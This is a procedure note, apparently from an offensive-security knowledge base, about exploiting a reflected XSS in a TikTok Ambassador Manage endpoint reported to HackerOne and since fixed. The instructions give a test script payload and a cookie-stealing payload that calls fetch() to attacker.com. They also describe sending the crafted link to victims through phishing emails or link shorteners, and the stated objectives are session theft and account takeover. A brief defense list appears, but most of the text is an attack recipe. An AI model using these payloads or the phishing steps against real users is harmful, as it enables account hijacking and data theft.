---
tags:
  - xss
  - reflected-xss
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
id: 44c30674-200a-4d31-8687-4f4ce8699242
created_at: '2025-12-14T17:26:17.701Z'
updated_at: '2025-12-14T17:26:17.701Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Reflected-XSS-Payload-in-Ambassador-Manage

## Summary

This procedure exploits a reflected XSS vulnerability in the TikTok m.tiktok.com Ambassador Manage endpoint by injecting a malicious JavaScript payload into a user-controlled parameter that is reflected back without proper sanitization or encoding, resulting in arbitrary code execution in the victim's browser.

## Description

The Ambassador Manage endpoint on m.tiktok.com processes user inputs, such as query parameters or form fields, and reflects them directly into the HTML response without escaping special characters. An attacker can craft a URL with a payload like `<script>alert(document.cookie)</script>` in a reflected parameter (e.g., ?search= or similar). When a victim accesses the URL, the browser parses and executes the script, potentially allowing theft of session cookies, keystroke logging, or redirection to malicious sites. This was reported as HackerOne #1394440, rated medium severity (4.7), and fixed by implementing output encoding.

## Requirements

1. Access to a web browser for testing payloads
2. Knowledge of the target endpoint URL (m.tiktok.com/ambassador/manage or similar path)
3. Victim interaction via a crafted link (e.g., email or social media)

## Defense

Defensive measures and detection strategies:

- Implement content security policy (CSP) to restrict script execution
- Use output encoding (e.g., HTML entity encoding) for all user inputs reflected in responses
- Monitor for anomalous JavaScript execution via web application firewall (WAF) rules targeting common XSS payloads
- Enable browser security features like XSS Auditor

## Objectives

1. Execute arbitrary JavaScript in the victim's browser context
2. Steal sensitive data like session cookies for account takeover
3. Demonstrate phishing or defacement potential

## Instructions

### Step 1: Identify Reflected Parameter

**Context**: Locate a user input field or query parameter in the Ambassador Manage endpoint that is echoed back in the response without sanitization, such as a search box or error message field.

Navigate to m.tiktok.com and access the Ambassador Manage section. Inspect network requests using browser developer tools to identify parameters like ?q= or ?input= that appear unsanitized in the HTML.

### Step 2: Craft and Test Payload

**Context**: Construct a simple XSS payload to verify reflection and execution.

Append a test payload to the URL, e.g., https://m.tiktok.com/ambassador/manage?q=<script>alert('XSS')</script>. Load the page in a browser. If the alert triggers, the vulnerability is confirmed.

For stealthier testing, use a payload that exfiltrates data: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>.

### Step 3: Simulate Victim Interaction

**Context**: Deliver the malicious URL to a victim to achieve execution.

Share the crafted URL via phishing email or link shortening service. Upon click, the payload executes in the victim's session, allowing data theft if they are authenticated.

**Expected Output**: JavaScript execution confirmed by alert, network request to attacker server, or console logs showing cookie access.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[web]]
- [[injection]]
